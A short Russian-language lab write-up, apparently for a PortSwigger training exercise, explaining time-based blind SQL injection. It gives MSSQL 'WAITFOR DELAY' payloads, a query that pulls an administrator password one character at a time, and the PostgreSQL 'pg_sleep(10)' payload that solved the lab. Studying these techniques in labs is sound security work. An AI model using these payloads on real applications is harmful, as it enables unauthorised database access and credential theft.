# Blind SQL injection with time delays

## Theory

<h3>Использование слепых SQL-инъекций путем использования временных задержек</h3>

В этой ситуации часто можно использовать уязвимость слепой инъекции SQL, вызывая временные задержки, в зависимости от введенного условия. Поскольку SQL-запросы обычно обрабатываются приложением синхронно, задержка выполнения SQL-запроса также приведет к задержке ответа HTTP. Это позволяет нам сделать вывод об истинности внедренного условия на основе времени, затраченного до получения ответа HTTP.

Методы запуска временной задержки сильно зависят от типа используемой базы данных. В Microsoft SQL Server следующий запрос может использоваться для проверки условия и запуска задержки в зависимости от того, истинно ли выражение:
```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

Первый из этих входов не вызовет задержку, потому что условие **1=2** ложно. Второй вход вызовет задержку в 10 секунд, потому что условие **1=1** истинно.

Используя эту технику, мы можем получать данные, проверяя по одному символу за раз:
```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:10'--
```

## Writeup

Главная страница:

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_time_delays/assets/1.png)

Выбираем пункт Gifts. Отправляем запрос. Ответ от приложения приходит через 10 секунд.
```
WNZ'||pg_sleep(10)--;
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_time_delays/assets/2.png)

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_time_delays/assets/3.png)

